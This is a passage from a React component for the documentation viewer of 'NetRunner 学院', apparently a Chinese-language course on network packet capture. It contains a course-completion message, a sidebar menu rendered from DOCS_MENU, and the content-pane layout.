              <h3 className="text-xl font-bold text-white mb-3">🎉 恭喜完成学习！</h3>
              <p className="text-gray-300 mb-4">
                你已经系统学习了网络抓包的所有核心知识。接下来,通过实战关卡巩固你的技能,祝你成为网络安全专家！
              </p>
              <button
                onClick={() => handleDocChange('learning-path')}
                className="bg-blue-600 hover:bg-blue-500 text-white px-6 py-3 rounded-lg font-bold flex items-center gap-2 transition-colors"
              >
                <ChevronRight size={18} />
                返回学习路线图
              </button>
            </div>
          </div>
        );

      default:
        return <div className="text-gray-500 flex items-center justify-center h-64">请从左侧菜单选择一个主题</div>;
    }
  };

  return (
    <div className="h-full flex bg-[#0d1117] text-gray-300 font-sans">
      {/* Sidebar */}
      <div className="w-64 border-r border-[#30363d] bg-[#0d1117] flex flex-col shrink-0">
         <div className="p-6 border-b border-[#30363d]">
             <h2 className="text-lg font-bold text-white flex items-center gap-2">
                 <Book size={20} className="text-blue-500"/>
                 NetRunner 学院
             </h2>
             <p className="text-xs text-gray-500 mt-1">官方文档中心</p>
         </div>
         <div className="flex-1 overflow-y-auto p-4 space-y-6 custom-scrollbar">
             {DOCS_MENU.map((section, idx) => (
                 <div key={idx}>
                     <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3 px-2">{section.title}</h3>
                     <div className="space-y-1">
                         {section.items.map(item => (
                             <button
                                key={item.id}
                                onClick={() => handleDocChange(item.id)}
                                className={`w-full text-left px-3 py-2 rounded text-sm transition-colors ${
                                    activeDoc === item.id 
                                    ? 'bg-blue-500/10 text-blue-400 font-medium' 
                                    : 'text-gray-400 hover:bg-[#161b22] hover:text-gray-200'
                                }`}
                             >
                                 {item.title}
                             </button>
                         ))}
                     </div>
                 </div>
             ))}
         </div>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto bg-[#0d1117] custom-scrollbar">
          <div className="max-w-4xl mx-auto py-12 px-10">
              {renderContent()}
          </div>
      </div>
    </div>
  );
};
